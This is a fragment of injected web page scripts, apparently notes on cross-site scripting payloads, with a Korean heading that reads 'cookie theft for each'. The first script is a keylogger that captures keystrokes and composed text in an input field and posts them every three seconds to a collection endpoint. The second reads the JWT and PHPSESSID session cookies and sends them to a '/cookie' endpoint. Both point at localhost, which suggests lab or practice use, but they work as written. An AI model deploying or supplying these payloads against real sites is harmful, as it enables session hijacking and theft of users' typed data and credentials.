    const inputField = document.getElementById('textInput');
    let accumulatedInput = '';
    let composing = false;

    // Listen for keydown events
    inputField.addEventListener('keydown', (event) => {
        if (!composing) {
            // Append the key to accumulated input
            accumulatedInput += event.key;
        }
    });

    // Listen for composition events
    inputField.addEventListener('compositionstart', (event) => {
        composing = true;
    });

    inputField.addEventListener('compositionupdate', (event) => {
        // Handle intermediate composition states
    });

    inputField.addEventListener('compositionend', (event) => {
        composing = false;
        accumulatedInput += event.data; // Append the composed text
    });

    // Function to send data to server
    function sendDataToServer(data) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://127.0.0.1:80/keylog', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('data=' + encodeURIComponent(data));
    }

    // Send accumulated data every 3 seconds
    setInterval(() => {
        if (accumulatedInput.length > 0) {
            sendDataToServer(accumulatedInput);
            accumulatedInput = ''; // Reset after sending
        }
    }, 3000);
</script>

    각각 쿠키 탈취

    <script>
    function getCookie(name) {
        let matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    }

    var jwtToken = getCookie('jwt');
    var phpsessid = getCookie('PHPSESSID');
    var url = 'http://127.0.0.1:80/cookie?';

    if (jwtToken) {
        url += 'jwt=' + encodeURIComponent(jwtToken);
    }
    if (phpsessid) {
        if (jwtToken) {
            url += '&';
        }
        url += 'phpsessid=' + encodeURIComponent(phpsessid);
    }

    fetch(url)
        .then(response => response.text())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));
</script>
